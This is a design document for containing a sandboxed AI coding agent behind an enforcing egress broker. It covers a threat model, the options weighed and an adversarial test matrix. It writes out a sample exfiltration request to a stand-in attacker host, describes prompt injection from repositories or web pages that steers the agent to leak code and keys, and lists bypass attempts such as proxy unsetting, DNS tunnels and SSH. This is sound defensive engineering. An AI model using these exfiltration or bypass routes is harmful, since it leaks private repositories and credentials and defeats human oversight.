# R5 — Developer-Hermes egress policy

**Slice:** `R5_EGRESS_POLICY_GATE`
**Date:** 2026-08-24
**Depends on:** `R5_CONTAINER_BOUNDARY_XS = PASS`, `R5_DEVELOPER_DX_XS = PASS`,
`R5_SECURITY_DELTA_REATTACK = PASS_WITH_FINDINGS`, `R5_RUNTIME_CONVERGENCE_XS = PASS`
**Status:** `R5_EGRESS_POLICY_GATE = PASS` — design gate, nothing implemented here
**Decides:** F06. The runtime constant `R5_F06_STATUS` deliberately stays
`OPEN_POLICY_DECISION` until `R5_EGRESS_POLICY_SMALL` lands, because the
running container still has unrestricted egress. The *decision* is closed
here; the *runtime state* is not.

```text
R5_CONFIDENTIALITY_CONTRACT      = HOST_AND_PRODUCTION_ISOLATION
                                   + PRIVATE_REPO_CONFIDENTIALITY_AGAINST_
                                     ARBITRARY_THIRD_PARTIES
SELECTED_EGRESS_ARCHITECTURE     = ENFORCING_BROKER_ON_INTERNAL_DOCKER_NETWORK
UNRESTRICTED_RAW_EGRESS          = DENIED
EGRESS_HERMES_CORE_CHANGES_REQUIRED = 0
DOCKER_AUTHORITY_REMAINS_ABSENT  = YES
IMPLEMENTATION_MAGNITUDE         = SMALL
```

This document is the reusable architectural truth for Developer-Hermes
outbound networking. A future agent must not need the originating chat
transcript. Machine-specific measurements stay in `.r5-dev/artifacts/`
(gitignored); the findings that changed the architecture are recorded here.

---

## 1. What R5 promises

R5 previously proved host isolation and production-authority isolation. It
never stated a confidentiality promise for the content the sandbox is
allowed to read. That gap was finding F06. It is now closed explicitly.

| Concern | R5 promise | Boundary that carries it |
|---|---|---|
| **A. Host isolation** | `MUST_PROTECT` | Container + literal two-repository bind allowlist |
| **B. Production authority isolation** | `MUST_PROTECT` | Credential absence; no Railway/Vercel/DB/Docker authority in the sandbox |
| **C. Private Repo B confidentiality** | `MUST_PROTECT` against arbitrary third-party destinations; `BEST_EFFORT` against approved processors | Egress topology + destination policy (this document) |
| **D. Developer model-credential confidentiality** | `MUST_PROTECT` against exfiltration off-box; `OUT_OF_SCOPE` against in-sandbox read | Egress topology; the key is readable in-process by design |
| **E. Persistent `HERMES_HOME` state confidentiality** | Same class as C — `MUST_PROTECT` against arbitrary destinations | Egress topology; `-Mode reset` for recovery |

Two of these need their limits spelled out, because a promise that
overstates itself is worse than no promise.

**C is not perfect DLP.** Any content the sandbox may read can be sent to a
destination the policy allows. The promise is that the *set of possible
recipients* is a short, named, human-approved list — not the Internet. An
adversary who wants Repo B out cannot pick their own collection endpoint.

**D distinguishes secret confidentiality from secret usability.** Malicious
code inside the sandbox can always read `OPENAI_API_KEY`, because Hermes
needs it in-process. What the egress policy changes is whether the key can
be *carried out* to a third party. It can still be *used* against the
allowed model endpoint from inside the sandbox, so quota burn remains a
real cost risk and is mitigated commercially, not by networking.

---

## 2. Approved external processors vs arbitrary destinations

Not all outbound traffic is equivalent, and treating it as equivalent
produces either a useless agent or a false sense of safety.

An **approved external processor** is a named service that Developer Hermes
is *intended* to send task content to, under a human decision, so that it
can do its job. A cloud model provider is the obvious case: inference
requires transmitting code and context. That is a data-processing
relationship, not exfiltration.

An **arbitrary external destination** is any host nobody approved. Sending
Repo B there is exfiltration regardless of which process did it or why.

The policy therefore classifies destinations, not packets:

| Class | Examples | Content sent | Default |
|---|---|---|---|
| `MODEL_PROVIDER` | configured inference endpoint(s) | Task context and source by design | ALLOW — approved processor |
| `RESEARCH_PROCESSOR` | Hermes web-search/fetch provider API | Query strings and target URLs | ALLOW — approved processor, bounded |
| `SOURCE_CONTROL_READ` | GitHub HTTPS read/fetch endpoints | Requests only; sandbox holds no GitHub credential | ALLOW |
| `LANGUAGE_PACKAGE_REGISTRY` | PyPI + its file CDN, npm registry | Requests only; sandbox holds no publish credential | ALLOW |
| `OS_PACKAGE_REGISTRY` | Debian archive + security mirrors | Requests only | ALLOW |
| `SUPPLY_CHAIN_SAFETY` | vulnerability/malware lookup used before running fetched packages | Package names | ALLOW |
| `RUNTIME_ARTIFACT` | pinned runtime/toolchain downloads | Requests only | ALLOW on demand |
| `OTHER_ARBITRARY_NETWORK` | everything else, including raw TCP, SSH, arbitrary DNS resolvers | — | **DENY, fail closed** |

The distinction survives the obvious objection: an approved processor is
still a place data goes. The point is that it is a *decided* place, with an
operator, a contract, and a name in a policy file that a human can read.

---

## 3. Network classes actually needed

Measured on the running Developer-Hermes container plus a static inventory
of Hermes core network call sites.

```text
REQUIRED_NETWORK_CLASSES =
  MODEL_PROVIDER
  LANGUAGE_PACKAGE_REGISTRY   (PyPI + file CDN, npm registry)
  OS_PACKAGE_REGISTRY         (Debian archive + security)
  SOURCE_CONTROL_READ         (GitHub HTTPS fetch/clone/API read)
  DNS                         (resolved by the broker, not by the sandbox)

OPTIONAL_NETWORK_CLASSES =
  RESEARCH_PROCESSOR          (web search / page retrieval provider API)
  SUPPLY_CHAIN_SAFETY         (vulnerability lookup before running fetched code)
  MODEL_METADATA              (model catalogue / provider capability discovery)
  RUNTIME_ARTIFACT            (pinned toolchain downloads, rare)

UNNECESSARY_NETWORK_CLASSES =
  OUTBOUND_SSH                (no remote push authority exists by design)
  ARBITRARY_DIRECT_WEB        (superseded by RESEARCH_PROCESSOR)
  ARBITRARY_RAW_TCP_UDP
  ARBITRARY_EXTERNAL_DNS_RESOLVERS
  HOST_GATEWAY / HOST_LAN
  INBOUND_ANYTHING            (no published ports today)
  TELEMETRY                   (no third-party telemetry in Hermes core)
```

Upstream `hermes update` (git pull + package install) is deliberately *not*
a required class: Developer Hermes runs pinned pure upstream from
`/opt/hermes`, and updates happen by rebuilding the image from a new pinned
digest, on the host, through the canonical launcher.

---

## 4. Threat model under the current unrestricted egress

The container today runs on the default bridge with every proxy variable
unset. `webhook.site`, `pastebin.com`, arbitrary IP literals and
`github.com:22` are all reachable. Maximum damage is assessed against the
authority the sandbox legitimately holds: Repo A + Repo B read/write, the
Developer model key, and persistent `HERMES_HOME`.

| # | Scenario | Max damage today | Changed by this policy |
|---|---|---|---|
| 1 | Normal well-behaved Hermes | Intended traffic only | No behavioural change |
| 2 | Strong model makes a mistake | Accidental request to an unintended host; low volume | Denied and logged |
| 3 | Weak model makes a mistake | Same, more often; may paste content into a random API while "testing" | Denied and logged |
| 4 | Prompt injection from repository content | Full Repo A+B copy, model key and `HERMES_HOME` to an attacker endpoint | Attacker endpoint unreachable |
| 5 | Prompt injection from public web content | Same as 4, and the injected instruction usually names the collection URL | Named URL unreachable |
| 6 | Malicious dependency / lifecycle script | Arbitrary code at install time with full sandbox authority and full egress | Code still runs; its collection endpoint is unreachable |
| 7 | Poisoned Skill / `HERMES_HOME` | Persistent, survives container removal; exfiltrates on every session | Persistence unchanged; exfiltration path removed. Recovery is `-Mode reset` |
| 8 | Deliberately malicious agent behaviour | Complete loss of Repo B confidentiality | Reduced to approved-processor channels only |
| 9 | Compromised upstream package | Same as 6, with better disguise | Same as 6 |

```text
MODEL_STRENGTH_SECURITY_DEPENDENCE = HIGH  (today)
                                   → LOW   (after this policy)
```

Today the only thing standing between scenarios 4–9 and a full Repo B
disclosure is that the code running in the sandbox chooses not to do it.
That is a behavioural expectation, not a boundary, and cases 6, 7 and 9 are
not model behaviour at all — a lifecycle script runs whatever the package
author wrote, regardless of how good the model is. A boundary that only
holds for well-aligned strong models does not hold.

After this policy, the reachable-destination set is decided by
infrastructure the sandbox cannot reconfigure, so it holds identically for a
frontier model, a cheap model, and hostile code with no model at all.

---

## 5. Options evaluated

Scores are 1–10, higher is better. "Operational simplicity" is stated as a
benefit so that every column points the same way (10 = simplest to run).

| Option | Security | Dev capability | Repo confidentiality | Maintainability | Update elegance | Operational simplicity | Performance |
|---|---|---|---|---|---|---|---|
| **A** Unrestricted (current) | 3 | 10 | 1 | 10 | 10 | 10 | 10 |
| **B** Logging proxy only | 4 | 10 | 2 | 7 | 9 | 7 | 9 |
| **C** Enforcing proxy + destination policy | 8 | 8 | 8 | 7 | 9 | 6 | 9 |
| **D** Static domain allowlist (rigid) | 8 | 5 | 8 | 4 | 8 | 6 | 9 |
| **E** Network off by default + human open | 10 | 2 | 9 | 8 | 9 | 5 | 6 |
| **F** Multi-profile private/research split | 7 | 7 | 5 | 4 | 7 | 3 | 8 |
| **G** Hybrid (**selected**) | 9 | 9 | 8 | 7 | 9 | 6 | 9 |

**Leading candidates were C, E and G.**

**A** is disqualified on confidentiality alone. It scores perfectly on
everything except the one property this gate exists to establish.

**B** is the seductive wrong answer. Observability is not a boundary: a
proxy that records an exfiltration and forwards it has exfiltrated. B earns
a 2 rather than a 1 only because detection shortens the recovery window.

**D** fails on maintainability rather than security. A frozen list of exact
domains breaks the first time a package moves to a new CDN, and every break
lands on the developer mid-task. Its security is identical to C, so the
rigidity buys nothing.

**E** has the best security number and the worst outcome. Constant human
gating destroys the "no micro-approvals" property that R5 was built for,
and an approval prompt that fires twenty times an hour gets approved
reflexively — which converts a strong boundary into a weak one via human
factors. It survives as a *mode*, not as the default.

**F** looks attractive and dissolves on contact with persistent state. A
research profile is only meaningful if it cannot read Repo B, and the moment
it shares `HERMES_HOME` it reads Repo B indirectly through sessions,
memories and Skills. Giving it a separate home costs the developer their
accumulated context exactly when they switch to research — which is
mid-task, constantly. Two homes, two configs, two credential scopes and a
switching ritual, in exchange for a confidentiality gain that the shared
state quietly cancels.

**G** is C plus three specific decisions that fix C's weaknesses: allowlist
by destination *class* with a documented one-file review path (fixes D's
brittleness), route public web research through an approved retrieval
provider instead of direct browsing (recovers the capability C would lose),
and keep an explicit offline mode for running untrusted code (recovers E's
strength where it is cheap).

---

## 6. Selected architecture

```text
SELECTED_EGRESS_ARCHITECTURE = G_HYBRID
  enforcing destination-policy broker
  on an internal Docker network
  + provider-mediated public web research
  + explicit offline mode
```

```
┌──────────────────────────────────────────────────────────┐
│ Docker network  r5-dev-internal   (internal: true)       │
│   no default route · no external DNS · no host gateway   │
│                                                          │
│   ┌───────────────────────┐        ┌──────────────────┐  │
│   │ r5-developer-hermes   │───────►│ r5-egress-broker │  │
│   │ Repo A RW, Repo B RW  │  3128  │  destination     │  │
│   │ model key, HERMES_HOME│        │  policy + audit  │  │
│   └───────────────────────┘        └────────┬─────────┘  │
└─────────────────────────────────────────────┼────────────┘
                                              │
┌─────────────────────────────────────────────┼────────────┐
│ Docker network  r5-dev-egress (bridge)      ▼            │
│                                   allowlisted classes    │
│                                   everything else: DENY  │
└──────────────────────────────────────────────────────────┘
```

The Developer container attaches to the internal network **only**. The
broker is dual-homed. That single topological fact is the boundary; the
`HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY` variables injected into the
container are convenience routing so ordinary tools work, not a control.

### Why the topology and not the proxy variables

Measured on this host, from a container attached only to an internal
network:

- Every external name fails to resolve. Docker Desktop's embedded resolver
  does not forward for internal-only networks. This is **stronger** than the
  limitation stated in upstream `docs/security/network-egress-isolation.md`,
  which assumes external DNS still resolves.
- Raw UDP to `1.1.1.1:53` and `8.8.8.8:53` fails — no DNS tunnel.
- Connecting to a bare IP literal fails — no hostname bypass.
- `host.docker.internal`, `gateway.docker.internal`, the Docker Desktop
  resolver, the host gateway and the default bridge are all unreachable —
  no host pivot and no lateral movement to other containers.
- Deleting `HTTP_PROXY` and `HTTPS_PROXY` does **not** restore egress; curl
  then fails with "Could not resolve host". The bypass that would defeat an
  env-var-only design fails closed here.

Through the broker, with a destination policy in place, `curl`, `uv pip`,
`npm` and `git` over HTTPS all work for allowlisted hosts and receive a
clean `403` for everything else.

### Consequences the developer will actually notice

- Outbound SSH is gone. Git over SSH cannot work. This costs nothing today
  because the sandbox holds no SSH key and no push authority.
- Direct browsing to an arbitrary URL from inside the sandbox is gone.
  Research goes through the retrieval provider instead (§7).
- A genuinely new destination produces an immediate, readable denial rather
  than a silent hang, and adding it is a one-line policy edit plus a broker
  restart.

### Implementation boundaries for the next slice

Allowed: launcher and Docker network topology, a broker container built
from a pinned image, a checked-in policy file, injected proxy environment
variables, audit configuration, tests.

Forbidden: any change under Hermes core, Docker socket exposure, privileged
mode, host network namespace, host firewall or ACL changes, published
inbound ports, production access.

The broker must forward plain HTTP for allowlisted hosts as well as
tunnelling `CONNECT`, because `apt` uses plain HTTP. A `CONNECT`-only broker
silently breaks `apt-get update` — measured, not assumed.

---

## 7. Public web research

Arbitrary direct web access and meaningful Repo B confidentiality cannot
coexist. `GET https://attacker.example/?d=<repo>` is a complete
exfiltration channel, and any allowlist that includes "the web" includes
that. There is no path-, method-, or header-level restriction that survives
a deliberate adversary, because the adversary controls the URL, the query
string, the body, and can fall back to DNS names, WebSockets or raw TCP if
the HTTP surface is narrowed.

The resolution is to change who does the fetching. Hermes already ships
server-side retrieval tools whose providers fetch the page and return its
content. The sandbox then talks to exactly one named API instead of to the
open Internet.

```text
PUBLIC_WEB_RESEARCH_POLICY = PROVIDER_MEDIATED_RETRIEVAL
```

Documentation lookup, technical research, package documentation, and
upstream issue/release research all continue to work. GitHub HTTPS read
remains directly allowed, so release notes, issues and source stay
first-class.

The honest residual: the query string and the requested URL are attacker-
controllable, so a low-bandwidth channel to the retrieval provider exists.
It is bounded, it is logged, and it terminates at a named processor rather
than at an endpoint the attacker chose. That is a real reduction, not a
perfect one, and this document does not claim otherwise.

---

## 8. Prevention, detection, containment, recovery

Conflating these is how observability gets mistaken for a boundary.

**Prevention.** The internal network prevents reaching any destination the
broker does not allow, including by IP literal, alternate DNS, SSH and raw
TCP. It does **not** prevent sending sensitive content to an allowed
destination, and it does not prevent the model provider from receiving the
code it needs for inference. Those are accepted, named channels.

**Detection.** The broker's audit record shows which destinations were
attempted and which were denied. A burst of denials is a strong
prompt-injection signal. Detection covers nothing about content.

**Containment.** A compromised sandbox stays confined to the two repository
mounts, its own `HERMES_HOME`, and the allowed destination set. It cannot
pivot to the host, to other containers, or to production.

**Recovery.** Persistent poisoning is removed with the existing
`launch-developer-hermes.ps1 -Mode reset`, which deletes only the
`r5-developer-hermes-home` volume. A suspected model-key exposure is
resolved by rotating the dedicated key, which is why the key is dedicated
and restricted in the first place. Repository damage is recovered through
Git, and the dedicated clones are never executed on the host.

---

## 9. Per-area policy

```text
MODEL_PROVIDER_EGRESS_POLICY =
  Explicit trusted class. Multiple providers may be configured, each one an
  explicit policy entry. Adding OpenRouter or any other provider is a
  deliberate policy change (one allowlist line + review), never an
  automatic consequence of setting a key. Model routing stays
  configuration-only and needs no core change; a route to an unlisted
  provider fails closed at the broker with a readable denial.

PACKAGE_EGRESS_POLICY =
  Allow the registry classes, not a frozen host list: PyPI and its file
  CDN, the npm registry, Debian archive and security mirrors, GitHub
  release assets. Package managers stay enabled — the objective is the
  destination set, not the tool. Arbitrary Git dependencies pointing at
  non-GitHub hosts will be denied; that is the intended trade, with a
  documented review path when a real need appears.

GIT_EGRESS_POLICY =
  HTTPS read/fetch/clone against allowlisted source-control hosts. No SSH.
  No push authority (unchanged from the existing contract). Local commits
  are unaffected because they never touch the network.

DNS_POLICY =
  The sandbox performs no external name resolution at all. Docker's
  embedded resolver serves only the broker's service name. All external
  resolution happens broker-side as part of the allow decision, which is
  what closes the DNS-tunnel channel.

HERMES_HOME_EGRESS_TRUST_MODEL =
  SINGLE_TRUST_DOMAIN_SHARED_HOME.
  Repo A, Repo B and HERMES_HOME are one confidentiality domain under one
  egress policy. Persistent state is treated as containing private context,
  because sessions, memories and Skills demonstrably do. No profile may
  claim a weaker egress posture while sharing this home; a genuinely
  lower-trust posture would require a separate home, and the shared-home
  leak is precisely why the multi-profile option was rejected.

MULTI_PROFILE_NETWORK_POLICY = NOT_RECOMMENDED
  One enforced policy, plus an explicit offline switch (`--network none`)
  for running untrusted code or dependency installs under review. That is a
  topology switch, not a second confidentiality posture, so it cannot drift
  from the first.

SELECTED_NETWORK_PROFILE_MODEL = SINGLE_ENFORCED_PROFILE_PLUS_OFFLINE_SWITCH
```

---

## 10. Model-key blast radius

Restricting egress materially reduces key **theft** and does nothing about
in-sandbox **use**. Both statements matter.

Theft requires carrying the secret to somewhere the attacker can read it.
Under this policy the reachable set contains no attacker-controlled
endpoint, so the practical exfiltration paths reduce to the bounded
retrieval-query channel and to encoding the key into requests aimed at an
allowed host whose operator would have to be complicit.

Use does not require exfiltration at all. Malicious code can spend the key
against the allowed model endpoint from inside the sandbox. Networking
cannot fix that; the mitigations are commercial and are already partly in
place: a dedicated restricted key, restricted project permissions, a model
allowlist, a project spend limit, and rotation.

```text
MODEL_KEY_RESIDUAL_RISK =
  LOW for third-party theft
  MEDIUM for in-sandbox quota abuse (bounded by project spend limit)
MODEL_KEY_EGRESS_REQUIREMENT =
  The key must reach configured model-provider endpoints only. No other
  destination class needs it, and no other destination class should be able
  to receive a request carrying it.
```

---

## 11. Failure behaviour

```text
FAILURE_MODE_POLICY = FAIL_CLOSED_WITH_LEGIBLE_DIAGNOSTICS
```

| Condition | Behaviour |
|---|---|
| Broker unavailable | No egress at all — topology, not policy. Launcher preflight reports the broker as down before the developer starts working |
| Policy file missing or malformed | Broker refuses to start. Never falls back to allow-all |
| DNS fails at the broker | That single request fails; the boundary is unaffected |
| Approved model provider unreachable | Normal upstream outage; the error surfaces as a provider error, not as a policy error |
| New package registry encountered | Explicit denial, named in the audit record, with the destination visible so the human can decide |
| Unknown domain requested | Explicit denial, logged, immediate readable error to the developer |
| Configuration malformed | Fail closed at launch with a specific message |

Fail-closed must not mean opaque. Every denial names the destination that
was refused, so routine troubleshooting is a matter of reading one line
rather than bisecting the network.

---

## 12. Audit

```text
EGRESS_AUDIT_POLICY = METADATA_ONLY_DESTINATION_LEDGER
```

Recorded per outbound attempt: timestamp, destination host, port, protocol,
policy class, allow/deny decision, and — where the broker can attribute it —
a coarse client identifier.

Never recorded: API keys, `Authorization` or other credential headers,
request or response bodies, source code, prompts, repository contents, URL
query strings.

Retention is proportionate: a size-capped rolling log in a dedicated Docker
volume, not in either repository and not in `HERMES_HOME`. The audit trail
is a detection aid and an operational debugging aid. It is explicitly **not**
a confidentiality control.

---

## 13. Adversarial test matrix for the implementation slice

`EGRESS_ADVERSARIAL_TEST_MATRIX` — every row must fail closed, be executed
non-destructively, and be automated in `tests/r5_developer_hermes/`.

| # | Attempt | Required result |
|---|---|---|
| 1 | Raw TCP to an arbitrary external host/port | DENY |
| 2 | Raw TCP to a bare IP literal, no hostname | DENY |
| 3 | IPv6 literal and IPv6-only destination | DENY |
| 4 | `curl` to a non-allowlisted host | DENY |
| 5 | `curl` after unsetting `HTTP_PROXY`/`HTTPS_PROXY` | DENY (topology holds) |
| 6 | `curl` with `NO_PROXY=*` set by the attacker | DENY |
| 7 | Python `requests` / `httpx` direct to arbitrary host | DENY |
| 8 | Node global `fetch` to arbitrary host | DENY |
| 9 | `npm install` from a non-allowlisted registry or tarball URL | DENY |
| 10 | `uv` / `pip` with `--index-url` pointing at an arbitrary host | DENY |
| 11 | `git clone` / `ls-remote` against a non-allowlisted host | DENY |
| 12 | `git` over SSH to any host | DENY |
| 13 | `ssh` to any host | DENY |
| 14 | DNS query to an external resolver (UDP and TCP) | DENY |
| 15 | Custom `/etc/resolv.conf` written inside the container | DENY |
| 16 | HTTP redirect from an allowed host to a denied host | DENY at the broker |
| 17 | WebSocket upgrade to a denied host | DENY |
| 18 | `CONNECT` to an allowed host on a non-standard port | DENY |
| 19 | Reaching the host gateway or `host.docker.internal` | DENY |
| 20 | Reaching another container on the default bridge | DENY |
| 21 | Malicious Skill in `HERMES_HOME` attempting egress | DENY |
| 22 | Malicious Git hook attempting egress | DENY |
| 23 | Package lifecycle script attempting egress | DENY |
| 24 | Behaviour after container restart | DENY still enforced |
| 25 | Behaviour after broker restart / while broker is down | DENY (no fallback) |
| 26 | Allowlisted model provider, registries, GitHub HTTPS | ALLOW — positive controls |
| 27 | `apt-get update` through the broker | ALLOW — plain-HTTP forwarding regression |
| 28 | Docker socket / daemon reachable from the sandbox | ABSENT |

Rows 26 and 27 are as important as the denials: a suite that only proves
things are blocked will happily pass on a completely broken sandbox.

---

## 14. Upstream update implications

```text
EGRESS_HERMES_CORE_CHANGES_REQUIRED = 0
UPSTREAM_UPDATE_ELEGANCE_IMPACT     = LOW
```

Everything lives in R5 container infrastructure: the launcher, two Docker
networks, a broker container, a policy file, and injected environment
variables. Hermes core is not patched, so the pinned-digest rebuild path,
the image-input fingerprint, the identity labels and the runtime-convergence
proof all keep working unchanged.

Hermes core already cooperates. The primary OpenAI and auxiliary client
paths resolve proxies explicitly from the environment and honour `NO_PROXY`
(`agent/process_bootstrap.py`, `agent/agent_runtime_helpers.py`), and
upstream already documents an egress-isolated Docker deployment in
`docs/security/network-egress-isolation.md`. This design is a stricter
instance of a pattern upstream already supports, which is why it survives
updates.

```text
UPSTREAM_UPDATE_EGRESS_CHECKS =
  1. Diff upstream for new outbound destinations, especially new default
     provider or catalogue endpoints.
  2. Re-verify that the primary and auxiliary model clients still resolve
     proxies from the environment and were not switched to trust_env=False
     or to a bypassing transport.
  3. Check for new package-management behaviour executed at runtime.
  4. Check for new gateway or networking assumptions, including any newly
     required inbound port.
  5. Re-run the full adversarial matrix in §13 against the rebuilt image.
  6. Confirm no new raw-socket or WebSocket path bypasses the broker.
  7. Confirm the allowlist still covers everything the smoke test needs;
     a new required destination is a policy decision, not a silent addition.
```

This feeds `R5_UPSTREAM_UPDATE_CONTRACT_XS`.

Two known interactions to carry forward. MCP stdio servers receive a
filtered environment (`tools/mcp_tool.py`, `_SAFE_ENV_KEYS`) that excludes
proxy and CA variables, so a networked stdio MCP server fails closed until
its proxy environment is declared in its own server config. Node's global
`fetch` ignores `HTTP_PROXY` entirely, so Node code that must reach the
network needs an explicit proxy agent; it fails closed rather than leaking.

---

## 15. Desktop, Bot Mode, rollback

```text
DESKTOP_EGRESS_COMPATIBILITY  = MANAGEABLE
BOT_MODE_EGRESS_COMPATIBILITY = GOOD
```

**Desktop.** The egress design requires nothing from Desktop and grants it
nothing: no host execution authority, no Docker daemon authority beyond
what a host application controlling a container runtime inherently has, no
broad networking authority. One measured constraint must be carried
forward: a container attached only to an internal network **cannot publish a
host port** — `docker run -p` starts, but no host binding is created and the
host cannot connect. A future Desktop that talks to a gateway inside the
container therefore needs either `docker exec` or a dual-homed transport
sidecar. That is a solvable design task, which is why this is `MANAGEABLE`
rather than `GOOD`, and it is better discovered now than during Desktop
remediation.

**Bot Mode.** Outbound polling with no public inbound port fits this
architecture directly: add the platform API to the allowlist and nothing
else changes. Bot Mode also *strengthens* the case for the policy, because
it feeds untrusted third-party message content into the agent continuously
and unattended. That is scenario 5 from §4 running on a schedule with no
human watching the denials.

```text
BOT_MODE_EGRESS_REQUIREMENTS =
  platform API endpoints as an explicit allowlist class;
  no inbound port; outbound polling only;
  unattended operation makes the audit ledger and a denial-rate alert
  more valuable than in interactive use.
```

**Rollback.** The change is topological and reverses cleanly: recreate the
Developer container on the default bridge and remove the broker and the two
networks. No image rebuild, no Hermes core revert, no host state to undo.
The rollback path must itself be tested and must be an explicit, visible
action — never an automatic fallback when the broker is unhealthy, which
would convert the boundary into a suggestion.

---

## 16. Open questions

1. Which retrieval provider becomes the approved `RESEARCH_PROCESSOR`, and
   under which credential? Provider selection is a separate decision from
   this architecture.
2. Broker implementation choice (Squid with an allowlist config versus a
   small purpose-built broker). Squid is the lower-maintenance default;
   the requirement is plain-HTTP forwarding plus `CONNECT` tunnelling plus
   metadata-only logging.
3. Whether TLS interception is ever wanted. Current answer: **no**. It adds
   certificate distribution complexity across Python, Node, Git, apt and
   uv, it breaks pinning, and it buys content inspection this design
   deliberately does not promise.
4. Denial-rate alerting thresholds, particularly once Bot Mode exists.
5. Whether the offline mode should become the default for dependency
   installation of unreviewed packages.

---

## 17. Consistency with established R5 truths

Unchanged by this decision, and re-confirmed:

```text
DEVELOPER_HERMES_CONTROLLER      = PINNED_PURE_UPSTREAM
DEVELOPER_RUNTIME_SOURCE         = /opt/hermes
CONTAINER_MOUNT_BOUNDARY         = PRIMARY HOST BOUNDARY
REPO_A_REPO_B_SAME_TRUST_DOMAIN  = YES
DEDICATED_CONTAINER_CLONES       = DO_NOT_EXECUTE_ON_HOST
RESET_DEVELOPER_HERMES_HOME      = launch-developer-hermes.ps1 -Mode reset
RUNTIME_CONVERGENCE              = MANDATORY
MODEL_CREDENTIAL                 = DEDICATED_ALLOWLISTED_FILE
DOCKER_AUTHORITY_REMAINS_ABSENT  = YES
PRODUCTION_AUTHORITY             = ABSENT
CANONICAL_KNOWLEDGE_RETENTION    = PASS
```

The container mount allowlist remains the primary host boundary. This
document adds a second boundary of a different kind: the mount allowlist
decides what the sandbox may *read*, and the egress policy decides where
what it read may *go*.
